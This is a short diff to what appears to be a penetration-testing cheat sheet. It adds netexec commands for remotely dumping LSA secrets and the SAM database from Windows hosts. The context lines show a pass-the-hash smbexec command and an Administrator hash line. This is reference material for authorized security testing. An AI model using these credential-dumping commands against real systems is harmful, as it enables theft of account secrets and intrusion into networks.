@@ -108,6 +108,12 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c08
 > impact-smbexe -hashes <xxxx>
 ```
 
+Dumping LSA/SAM remotely: 
+```
+> netexec smb aaa.bbb.cc.ddd --local-auth -u USR -p PWD --lsa
+> netexec smb aaa.bbb.cc.ddd --local-auth -u USR -p PWD --sam
+```
+
 ## File
 
 ### File System
